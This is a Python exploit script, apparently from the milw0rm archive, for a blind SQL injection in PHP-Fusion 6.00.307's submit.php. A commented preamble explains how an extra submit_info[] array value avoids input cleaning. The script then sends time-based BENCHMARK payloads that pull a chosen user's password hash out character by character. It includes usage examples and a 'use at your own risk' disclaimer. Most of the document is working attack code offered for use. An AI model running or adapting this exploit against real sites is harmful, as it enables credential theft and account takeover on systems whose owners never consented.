#!/usr/bin/python
"""
#=================================================================================================#
#                     ____            __________         __             ____  __                  #
#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
#                     |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\               #
#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
#                     |___|___|  /\__|  /______  /\___  >__|            |___||__|                 #
#                              \/\______|      \/     \/                                          #
#=================================================================================================#
#                                     This was a priv8 Exploit                                    #
#=================================================================================================#
#  	           		         PHP-Fusion 6.00.307                                      #
#                                  And Probably All Other Versions                                #
#                                 Blind Sql Injection Vulnerability                               #
#                                         Benchmark Method                                        #
#====================================#===========#====================================#===========#
# Server Configuration Requirements  #           # Some Information                   #           #
#====================================#		 #====================================#           #
#                                                #                                                #
# magic_quotes_gpc = 0                           #  Vendor:   php-fusion.co.uk                    #
#                                                #  Author:   The:Paradox                         #
#================================================#  Severity: Moderately Critical                 #
#                                                #                                                #
#       Oh wow no-content space! Enjoy it!       #  Proud To Be Italian.                          #
#                                                #                                                #
#====================================#===========#================================================#
# Proof Of Concept / Bug Explanation #                                                            #
#====================================#                                                            #
# PHP-Fusion presents a critical vulnerability in submit.php page. Let's see source:   		  #
#=================================================================================================#

[Submit.php]

 1. if ($stype == "l") {
 2.
 3.	if (isset($_POST['submit_link'])) {
 4.
 5.	if ($_POST['link_name'] != "" && $_POST['link_url'] != "" && $_POST['link_description'] != "") {
 6.		$submit_info['link_category'] = stripinput($_POST['link_category']);
 7.		$submit_info['link_name'] = stripinput($_POST['link_name']);
 8.		$submit_info['link_url'] = stripinput($_POST['link_url']);
 9.		$submit_info['link_description'] = stripinput($_POST['link_description']);
10.		$result = dbquery("INSERT INTO ".$db_prefix."submissions (submit_type, submit_user, submit_datestamp, submit_criteria) VALUES ('l', '".$userdata['user_id']."', '".time()."', '".serialize($submit_info)."')");

#=================================================================================================#
# Look to the sql query.                                                                          #
# There are two variables: $userdata['user_id'] and a serialized array $submit_info.              #
# The user_id is an intval value and array values link_category, link_name, link_url and          #
# link_description are correctly cleaned via fusions' stripinput() function.                      #
#                                                                                                 #
# All seems pretty cleaned.                                                                       #
# But what would happen if we set another value into submit_info[] array via gpc vars?            #
# It will be set in the serialized array, and obvious it will not checked by stripinput.          #
# Sql Injection possibility!                                                                      #
#                                                                                                 #
# Let's see:                                                                                      #
#                                                                                                 #
# Host: 127.0.0.1                                                                                 #
# POST PHP-Fusion/submit.php?stype=l                                                              #
# link_category=1 link_name=1 link_url=1 link_description=1 submit_info[paradox]=' submit_link=1  #
#                                                                                                 #
# It will result in sql error in case of Mq = 0 :                                                 #
#                                                                                                 #
# You have an error in your SQL syntax; check [...]                                               #
#                                                                                                 #
#=================================================================================================#
# Normally to make this trick working register_globals = 1 is needed, but in php-fusion uses      #
# extract() to simulate register_globals when it is set to 0.                                     #
#=================================================================================================#
# Use this at your own risk. You are responsible for your own deeds.                              #
#=================================================================================================#
#                                      Python Exploit Starts                                      #
#=================================================================================================#
"""

from httplib import HTTPConnection
from urllib import urlencode
from time import time
from sys import exit, argv, stdout
from md5 import new

print """
#=================================================================#
#  	                PHP-Fusion v6.00.307                      #
#                  And Probably All Other Versions                #
#                 Blind Sql Injection Vulnerability               #
#                         Benchmark Method                        #
#                                                                 #
#                     Discovered By The:Paradox                   #
#                                                                 #
# Usage:                                                          #
#  ./fusiown [Target] [Path] [ValidId] [ValidPass] [TargetUserid] #
#                                                                 #
# Example:                                                        #
#  ./fusiown localhost /phpfusion/ 40 s3cr3t 1                    #
#  ./fusiown www.host.org / 791 myp4ssw0rd 1                      #
#=================================================================#
"""

if len(argv)<=5:	exit()
else:   print "[.]Exploit Starting."

prefix = "fusion_"
benchmark = "230000000"
vtime = 6
port = 80

target = argv[1]
path = argv[2]
cuid = argv[3]
cpass = argv[4]
uid = argv[5]

j=1
h4sh = ""
ht = []

for k in range(48,58):
	ht.append(k)
for k in range(97,103):
	ht.append(k)
ht.append(0)

def calc_md5(p):

	hash = new()
	hash.update(p)
	return hash.hexdigest()


print "[.]Blind Sql Injection Starts.\n\nHash:"
while j <= 32:
	for i in ht:
		if i == 0:	exit('[-]Exploit Failed.\n')

		start = time()
		conn = HTTPConnection(target,port)

		inj = "' OR (SELECT IF((ASCII(SUBSTRING(user_password," + str(j) + ",1))=" + str(i) + "),benchmark(" + benchmark + ",CHAR(0)),0) FROM " + prefix + "users WHERE user_id=" + uid + "))# BH > WH"

		conn.request("POST", path + "submit.php?stype=l", urlencode({'link_category': '1', 'link_name': '1', 'link_url': '1', 'link_description': '1', 'submit_link' : 'Submit+Link', 'submit_info[cGd0MQ==]' :  inj }), {"Accept": "text/plain", "Content-Type" : "application/x-www-form-urlencoded","Cookie": "fusion_user=" + cuid + "." + calc_md5(cpass) + ";"})
		response = conn.getresponse()
		read = response.read()


		if response.status == 404: exit('[-]Error 404. Not Found.')
		now = time()

		if now - start > vtime:
			stdout.write(chr(i))
			stdout.flush()
			h4sh += chr(i)
			j += 1
			break;

print "\n\n[+]All Done.\n-=Paradox Got This One=-"

# milw0rm.com [2008-04-19]